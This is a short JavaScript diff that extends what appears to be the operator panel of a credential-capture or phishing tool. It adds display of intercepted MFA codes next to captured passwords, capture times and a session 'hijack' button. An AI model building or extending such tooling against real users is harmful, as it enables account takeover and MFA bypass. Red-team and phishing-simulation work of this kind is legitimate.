@@ -12,6 +12,17 @@ function applyData(el, data) {
   el.querySelector('[data-field="time"]').textContent = data.lastCapturedAt;
   el.querySelector('[data-field="password"]').textContent = data.password;
 
+  const mfaField = el.querySelector('[data-field="mfa-field"]');
+  const mfaBadge = el.querySelector('[data-field="mfa-badge"]');
+  const mfaCode = el.querySelector('[data-field="mfa-code"]');
+  if (data.mfaCode) {
+    mfaField.hidden = false;
+    mfaBadge.textContent = "Intercepted";
+    mfaCode.textContent = data.mfaCode;
+  } else {
+    mfaField.hidden = true;
+  }
+
   const badge = el.querySelector('[data-field="session-badge"]');
   const session = el.querySelector('[data-field="session"]');
   const btn = el.querySelector('[data-action="hijack"]');
